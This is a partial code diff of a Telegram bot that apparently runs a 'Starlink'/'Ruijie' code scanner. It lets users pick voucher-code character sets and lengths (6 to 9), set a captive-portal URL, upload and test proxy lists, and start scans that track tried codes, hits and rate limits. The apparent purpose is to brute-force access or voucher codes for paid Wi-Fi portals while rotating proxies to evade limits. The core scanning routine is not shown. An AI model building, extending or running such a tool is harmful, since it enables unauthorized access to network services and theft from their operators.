+        elif selected_mode == "abc6":
+            ud["mode"] = "abc6"
+            ud["char_set"] = "abcdefghijkmnpqrstuvwxyz"
+            ud["code_len"] = 6
+            ud["start_digit"] = None
+        elif selected_mode == "mix6":
+            ud["mode"] = "mix6"
+            ud["char_set"] = "2345678" + "abcdefghijkmnpqrstuvwxyz"
+            ud["code_len"] = 6
+            ud["start_digit"] = None
+        elif selected_mode == "mix7":
+            ud["mode"] = "mix7"
+            ud["char_set"] = "2345678" + "abcdefghijkmnpqrstuvwxyz"
+            ud["code_len"] = 7
+            ud["start_digit"] = None
+        elif selected_mode == "mix8":
+            ud["mode"] = "mix8"
+            ud["char_set"] = "2345678" + "abcdefghijkmnpqrstuvwxyz"
+            ud["code_len"] = 8
+            ud["start_digit"] = None
+        elif selected_mode == "mix9":
+            ud["mode"] = "mix9"
+            ud["char_set"] = "2345678" + "abcdefghijkmnpqrstuvwxyz"
+            ud["code_len"] = 9
+            ud["start_digit"] = None
+        elif selected_mode == "custom":
+            ud["mode"] = "custom"
+            ud["char_set"] = "012345678"
+            ud["code_len"] = 6
+            ud["state"] = "waiting_for_digit"
+            ud["menu_msg_id"] = query.message.message_id
+            await query.message.edit_text("🔢 **Start Digit**\nဂဏန်းတစ်လုံးသာ ပြန်ပို့ပေးပါ။")
             return
-        lines = [f"`{h['code']}` - {h.get('plan', '...')} | {h.get('time_str', '...')}" for h in hits[-20:]]
-        text = "📦 **MY HITS**\n" + "\n".join(lines)
-        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
-                                      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("‹ RETURN", callback_data="btn_back_main")]]))
-        return
 
-    if data == "btn_start":
-        if not get_portal_url(user_id):
-            await query.edit_message_text(
-                "❌ **Portal URL not set!**\nUse 🔮 PORTAL first.",
-                parse_mode=ParseMode.MARKDOWN,
-                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("‹ RETURN", callback_data="btn_back_main")]]))
+        pm = get_proxy_manager()
+        proxy_total, proxy_active = pm.stats()
+        await query.message.edit_text(
+            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
+            f"⚙️ Current Mode: `{ud['mode']}`\n"
+            f"🔀 Proxies: `{proxy_active}/{proxy_total}`",
+            reply_markup=get_main_menu_markup(ud["use_proxy"]),
+            parse_mode=ParseMode.MARKDOWN,
+        )
+
+    elif data == "btn_back_main":
+        pm = get_proxy_manager()
+        proxy_total, proxy_active = pm.stats()
+        await query.message.edit_text(
+            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
+            f"⚙️ Current Mode: `{ud['mode']}`\n"
+            f"🔀 Proxies: `{proxy_active}/{proxy_total}`",
+            reply_markup=get_main_menu_markup(ud["use_proxy"]),
+            parse_mode=ParseMode.MARKDOWN,
+        )
+
+    elif data == "btn_add_proxies":
+        ud["state"] = "waiting_for_proxy_text"
+        ud["menu_msg_id"] = query.message.message_id
+        await query.message.edit_text(
+            "📥 **Proxy များကို တိုက်ရိုက် စာသားအနေဖြင့် (သို့မဟုတ်) `proxies.txt` ဖိုင်အနေဖြင့် ပို့ပေးပါ**\nDead proxies များကို အလိုအလျောက် စစ်ဆေးဖယ်ရှားပေးပါမည်။"
+        )
+
+    elif data == "btn_start_scanner":
+        if not ud["portal_url"]:
+            await query.message.edit_text(
+                "❌ Portal URL မရှိသေးပါ။ ကျေးဇူးပြု၍ `Update Portal` အရင်လုပ်ပါ။"
+            )
             return
-        await query.edit_message_text("⚡ Starting scanner...", parse_mode=ParseMode.MARKDOWN)
-        asyncio.create_task(run_user_scanner(context, user_id))
-        return
 
-    if data == "stop_scan":
-        if ud and not ud.get("stop_event", asyncio.Event()).is_set():
+        if ud["task"] and not ud["task"].done():
             ud["stop_event"].set()
-            save_user_state(user_id, ud)
-            await query.edit_message_text(
-                "🛑 **STOPPED**\n💾 State saved.",
-                parse_mode=ParseMode.MARKDOWN)
-        else:
-            await query.edit_message_text("ℹ️ No active scan.", parse_mode=ParseMode.MARKDOWN)
-        return
+            ud["dash_update_event"].set()
+            try:
+                await asyncio.wait_for(ud["task"], timeout=10.0)
+            except (asyncio.TimeoutError, asyncio.CancelledError):
+                ud["task"].cancel()
+                try:
+                    await ud["task"]
+                except:
+                    pass
 
-# ═══════════════════════════════════════════════════════════════════
-#  COMMANDS
-# ═══════════════════════════════════════════════════════════════════
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    ud = user_scanners.get(user_id, {})
-    mode = ud.get("mode", "num6")
-    portal = get_portal_url(user_id)
-    pm = get_proxy_manager()
-    real_total, real_alive = pm.stats()
-    text = (
-        "⚡ **ULTIMATE SCANNER** ⚡\n"
-        "━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"👤 User: `{user_id}`\n"
-        f"📜 Mode: `{MODES.get(mode, mode)}`\n"
-        f"🔀 Proxies: `{real_alive}/{real_total}`\n"
-        f"🔀 Direct: `{'ON' if pm.direct_enabled else 'OFF'}`\n"
-        f"🔮 Portal: {'✅ Ready' if portal else '❌ Not Set'}\n"
-        "━━━━━━━━━━━━━━━━━━━━━━\n"
-        "💡 Choose an option below:"
-    )
-    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN,
-                                    reply_markup=get_main_menu_markup())
+        ud["stop_event"].clear()
+        ud["stats"] = {
+            "tried": 0,
+            "hits": 0,
+            "expired": 0,
+            "limits": 0,
+            "start_time": time.time(),
+        }
+        ud["valid_codes"] = []
+        ud["limit_codes"] = []
+        ud["tried_codes"] = set()
+        ud["recent_logs"] = []
+        ud["CURRENT_CODE"] = "----"
 
+        await query.message.edit_text("🔄 Initializing scanner dashboard...")
+        ud["dash_msg_id"] = query.message.message_id
+        asyncio.create_task(run_user_scanner(context, user_id))
 
-async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    ud = user_scanners.get(user_id)
-    if ud and not ud["stop_event"].is_set():
+    elif data == "stop_scan":
         ud["stop_event"].set()
-        save_user_state(user_id, ud)
-        await update.message.reply_text(
-            "🛑 **STOPPED**\n"
-            f"💾 Saved: `{ud['tried']:,}` tried | `{ud['hits']}` hits\n"
-            "🔁 /start to resume anytime",
-            parse_mode=ParseMode.MARKDOWN)
-    else:
-        await update.message.reply_text("ℹ️ No active scan.")
+        ud["dash_update_event"].set()
 
-
-async def direct_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    pm = get_proxy_manager()
-    new_state = not pm.direct_enabled
-    await pm.set_direct_enabled(new_state)
-    state = "ON" if new_state else "OFF"
-    warn = ("✅ Scan will work even without proxies." if new_state
-            else "⚠️ Scan requires live proxies when OFF.")
-    await update.message.reply_text(
-        f"🔀 **Direct Mode: {state}**\n{warn}",
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=get_main_menu_markup())
-
-
-async def hits_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+@admin_only
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    await send_hits_file(update, context, user_id)
+    ud = get_user_data(user_id)
+    doc = update.message.document
+    if doc and doc.file_name.endswith(".txt"):
+        file = await context.bot.get_file(doc.file_id)
+        file_bytes = await file.download_as_bytearray()
+        try:
+            content = file_bytes.decode("utf-8")
+        except Exception:
+            content = file_bytes.decode("latin-1")
 
+        raw_lines = [line.strip() for line in content.splitlines() if line.strip()]
+        if not raw_lines:
+            await update.message.reply_text("❌ တင်လိုက်သော ဖိုင်ထဲတွင် Proxy များ မပါရှိပါ။")
+            return
 
-async def clearhits_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    count = await clear_user_hits(user_id)
-    await update.message.reply_text(
-        f"🗑 **HITS CLEARED**\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"Removed: `{count}` hits",
-        parse_mode=ParseMode.MARKDOWN)
+        status_msg = await update.message.reply_text("🔍 **Proxy များကို စစ်ဆေးနေပါသည် (Checking Dead Proxies)...** ⏳")
+        valid_count = await check_and_save_proxies(raw_lines)
+        pm = get_proxy_manager()
+        total, active = pm.stats()
+        ud["state"] = None
 
+        await status_msg.edit_text(
+            f"✅ **Proxies File Uploaded & Checked Successfully!**\n\n"
+            f"📥 Working Proxies Saved: `{valid_count}`\n"
+            f"📊 Active Proxies: `{active}/{total}`",
+            reply_markup=get_main_menu_markup(ud["use_proxy"]),
+            parse_mode=ParseMode.MARKDOWN,
+        )
 
-async def clearproxies_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in ADMIN_IDS:
-        await update.message.reply_text("⛔ Admin only")
-        return
-    old_count = await clear_all_proxies()
-    await update.message.reply_text(
-        f"🧹 **PROXIES CLEARED**\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"Removed: `{old_count}` proxies",
-        parse_mode=ParseMode.MARKDOWN)
-
-
-async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in ADMIN_IDS:
-        await update.message.reply_text("⛔ No permission")
-        return
-    pm = get_proxy_manager()
-    real_total, real_alive, dead_cnt, direct_on = pm.stats_detailed()
-    text = (
-        "👑 **ADMIN PANEL**\n"
-        "━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"👥 Users: `{len(user_scanners)}`\n"
-        f"🔀 Proxies: `{real_alive}/{real_total}`\n"
-        f"💀 Dead: `{dead_cnt}`\n"
-        f"🔀 Direct: `{'ON' if direct_on else 'OFF'}`\n"
-        f"⚡ Workers: `{NUM_WORKERS}`\n"
-        f"📊 Active Scans: `{sum(1 for u in user_scanners.values() if u.get('running'))}`\n"
-        "━━━━━━━━━━━━━━━━━━━━━━\n"
-        "Use /purge to clean dead proxies"
-    )
-    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
-
-
-async def purge_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in ADMIN_IDS:
-        await update.message.reply_text("⛔ No permission")
-        return
-    pm = get_proxy_manager()
-    removed = pm.purge_dead()
-    real_total, real_alive = pm.stats()
-    await update.message.reply_text(
-        f"🧹 **PURGED**\n"
-        f"Removed: `{removed}`\n"
-        f"Remaining: `{real_alive}/{real_total}`",
-        parse_mode=ParseMode.MARKDOWN)
-
-
-# ═══════════════════════════════════════════════════════════════════
-#  TEXT HANDLER
-# ═══════════════════════════════════════════════════════════════════
+@admin_only
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    text = (update.message.text or "").strip()
-    pm = get_proxy_manager()
+    ud = get_user_data(user_id)
+    state = ud.get("state")
+    text = update.message.text.strip()
 
-    if context.user_data.get("waiting_for_portal"):
-        context.user_data.pop("waiting_for_portal")
+    if state == "waiting_for_portal_url":
         if not text.startswith("http"):
-            await update.message.reply_text("❌ Invalid URL")
+            await update.message.reply_text("❌ ကျေးဇူးပြု၍ မှန်ကန်သော http/https URL ပို့ပါ။")
             return
-        set_portal_url(user_id, text)
-        if user_id in user_scanners:
-            user_scanners[user_id]["portal_url"] = text
-        await update.message.reply_text(
-            "✅ **Portal URL saved!**\n⚡ Ready to scan.",
+        ud["portal_url"] = text
+        ud["state"] = None
+        pm = get_proxy_manager()
+        proxy_total, proxy_active = pm.stats()
+        msg = await update.message.reply_text(
+            f"✅ Portal URL ကို အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ။\n\n"
+            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
+            f"⚙️ Current Mode: `{ud['mode']}`\n"
+            f"🔀 Proxies: `{proxy_active}/{proxy_total}`",
+            reply_markup=get_main_menu_markup(ud["use_proxy"]),
             parse_mode=ParseMode.MARKDOWN,
-            reply_markup=get_main_menu_markup())
-        return
+        )
+        ud["menu_msg_id"] = msg.message_id
 
-    if context.user_data.get("waiting_for_proxy"):
-        context.user_data.pop("waiting_for_proxy")
-        lines = [l.strip() for l in text.splitlines() if l.strip()]
+    elif state == "waiting_for_digit":
+        if text in ud["char_set"] and len(text) == 1:
+            ud["start_digit"] = text
+        else:
+            ud["start_digit"] = "0"
+        ud["state"] = None
+        pm = get_proxy_manager()
+        proxy_total, proxy_active = pm.stats()
+        msg = await update.message.reply_text(
+            f"✅ Custom Start Digit = `{ud['start_digit']}` သတ်မှတ်ပြီးပါပြီ။\n\n"
+            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
+            f"⚙️ Current Mode: `{ud['mode']}`\n"
+            f"🔀 Proxies: `{proxy_active}/{proxy_total}`",
+            reply_markup=get_main_menu_markup(ud["use_proxy"]),
+            parse_mode=ParseMode.MARKDOWN,
+        )
+        ud["menu_msg_id"] = msg.message_id
+
+    elif state == "waiting_for_proxy_text":
+        lines = [line.strip() for line in text.splitlines() if line.strip()]
         if not lines:
-            await update.message.reply_text("❌ Empty proxy list")
+            await update.message.reply_text("❌ Proxy list ဗလာဖြစ်နေပါသည်။ ထပ်မံကြိုးစားပါ။")
             return
-        try:
-            with open(PROXY_FILE, "w") as f:
-                f.write("\n".join(lines) + "\n")
-            pm.reload()
-        except Exception as e:
-            await update.message.reply_text(f"❌ Error: {e}")
-            return
-        real_total, real_alive = pm.stats()
-        await update.message.reply_text(
-            f"✅ **Proxies Saved**\n"
-            f"📊 Total: `{real_total}`\n"
-            f"✅ Active: `{real_alive}`\n"
-            f"🔀 Direct: `{'ON' if pm.direct_enabled else 'OFF'}`",
+        
+        status_msg = await update.message.reply_text("🔍 **Proxy များကို စစ်ဆေးနေပါသည် (Checking Dead Proxies)...** ⏳")
+        valid_count = await check_and_save_proxies(lines)
+        pm = get_proxy_manager()
+        total, active = pm.stats()
+        ud["state"] = None
+
+        msg = await update.message.reply_text(
+            f"✅ **Proxies Checked & Saved Successfully!**\n"
+            f"📥 Working Proxies: `{valid_count}`\n"
+            f"📊 Active: `{active}`\n\n"
+            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
+            f"⚙️ Current Mode: `{ud['mode']}`\n"
+            f"🔀 Proxies: `{active}/{total}`",
+            reply_markup=get_main_menu_markup(ud["use_proxy"]),
             parse_mode=ParseMode.MARKDOWN,
-            reply_markup=get_main_menu_markup())
-        return
+        )
+        ud["menu_msg_id"] = msg.message_id
 
-    ud = user_scanners.get(user_id, {})
-    mode = ud.get("mode", "num6")
-    portal = get_portal_url(user_id)
-    real_total, real_alive = pm.stats()
-    msg = (
-        "⚡ **ULTIMATE SCANNER** ⚡\n"
-        "━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"📜 Mode: `{MODES.get(mode, mode)}`\n"
-        f"🔀 Proxies: `{real_alive}/{real_total}`\n"
-        f"🔀 Direct: `{'ON' if pm.direct_enabled else 'OFF'}`\n"
-        f"🔮 Portal: {'✅ Ready' if portal else '❌ Not Set'}\n"
-        "━━━━━━━━━━━━━━━━━━━━━━"
-    )
-    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN,
-                                    reply_markup=get_main_menu_markup())
-
-
-# ═══════════════════════════════════════════════════════════════════
-#  ERROR HANDLER
-# ═══════════════════════════════════════════════════════════════════
-async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    err = context.error
-    if err:
-        traceback.print_exception(type(err), err, err.__traceback__)
-
-# ═══════════════════════════════════════════════════════════════════
-#  MAIN
-# ═══════════════════════════════════════════════════════════════════
+# ---------------- MAIN ----------------
 def main():
-    print("=" * 60)
-    print("⚡ ULTIMATE RUIJIE SCANNER BOT (24/7 ACTIVE) ⚡")
-    print("=" * 60)
-
-    keep_alive()
-
     pm = get_proxy_manager()
-    real_total, real_alive = pm.stats()
-    print(f"[MAIN] Proxies: {real_alive}/{real_total}")
-    print(f"[MAIN] Direct Mode: {'ON' if pm.direct_enabled else 'OFF'}")
-    print(f"[MAIN] Workers: {NUM_WORKERS}")
-    print(f"[MAIN] SID per: {MAX_CODES_PER_SID}")
+    total, active = pm.stats()
+    print(f"[MAIN] Proxy Manager initialized: {active}/{total} active proxies")
 
     app = Application.builder().token(BOT_TOKEN).build()
 
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("stop", stop_command))
-    app.add_handler(CommandHandler("direct", direct_cmd))
-    app.add_handler(CommandHandler("hits", hits_cmd))
-    app.add_handler(CommandHandler("clearhits", clearhits_cmd))
-    app.add_handler(CommandHandler("clearproxies", clearproxies_cmd))
-    app.add_handler(CommandHandler("admin", admin_cmd))
-    app.add_handler(CommandHandler("purge", purge_cmd))
-
+    app.add_handler(CommandHandler("addproxies", add_proxies_cmd))
     app.add_handler(CallbackQueryHandler(handle_callbacks))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
-    app.add_error_handler(error_handler)
 
-    print("[MAIN] Bot is running...")
-    app.run_polling(drop_pending_updates=True)
-
+    print("Bot is running with python-telegram-bot...")
+    print("Thank for using By Telegram@yarzar373")
+    app.run_polling()
 
 if __name__ == "__main__":
     try:
         main()
-    except KeyboardInterrupt:
-        print("\n[MAIN] Stopped by user")
-    except Exception as e:
-        print(f"\n[FATAL] {type(e).__name__}: {e}")
-        traceback.print_exc()
+    except (KeyboardInterrupt, SystemExit):
+        pass
